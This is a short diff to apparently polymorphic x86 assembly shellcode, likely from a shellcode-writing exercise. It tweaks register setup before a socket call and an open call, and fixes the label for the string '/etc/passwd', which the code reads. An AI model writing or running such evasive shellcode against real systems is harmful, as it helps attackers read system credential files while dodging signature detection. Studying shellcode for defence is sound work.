@@ -42,6 +42,7 @@ poly_sckt:
     dec ebx
     loop poly_sckt
     mov edx, ecx
+    add edx, 0x6
     push edx
     inc ecx
     push ecx
@@ -106,8 +107,7 @@ poly_shellcode:
     
     ; open
 
-    mov BYTE [esp -4], 0x1
-    sub esp, 0x4
+    push 0x1
     pop eax
     add eax, 0x4
     pop ebx
@@ -153,8 +153,9 @@ poly_shellcode:
 
 
 call_shellcode:
+
 ;    call shellcode
 ;    message db "/etc/passwd"
 
     call poly_shellcode
-    message db "/etc/passwd"
+    message: db "/etc/passwd"
